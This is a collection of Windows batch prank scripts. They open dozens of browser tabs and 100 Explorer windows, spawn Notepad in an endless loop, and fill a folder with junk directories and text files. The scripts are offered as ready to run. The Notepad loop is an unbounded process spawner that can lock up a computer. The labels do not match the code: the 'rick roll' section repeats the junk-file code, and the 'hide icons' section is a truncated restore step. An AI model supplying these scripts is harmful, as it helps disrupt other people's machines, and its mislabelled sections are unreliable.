
# open links 
@echo off
start "" "https://www.cnn.com"
start "" "https://www.bbc.com"
start "" "https://www.huffingtonpost.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"
start "" "https://github.com"

# open 100 folders
@echo off
for /l %%i in (1,1,100) do (
    start "" explorer.exe "C:\"
)

# notepad loop
@echo off
:loop
start notepad
goto loop

# create 100 folders
@echo off
for /l %%i in (1,1,100) do (
    mkdir "Folder_%%i"
)

# write nonsens

@echo off
for /l %%i in (1,1,50) do (
    echo Hello World %%i > "file%%i.txt"
)

# and rick roll
@echo off
for /l %%i in (1,1,50) do (
    echo Hello World %%i > "file%%i.txt"
)

# Hides all desktop icons. To restore
@echo off
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /f
taskkill /f /im explorer.exe
start explorer.exe
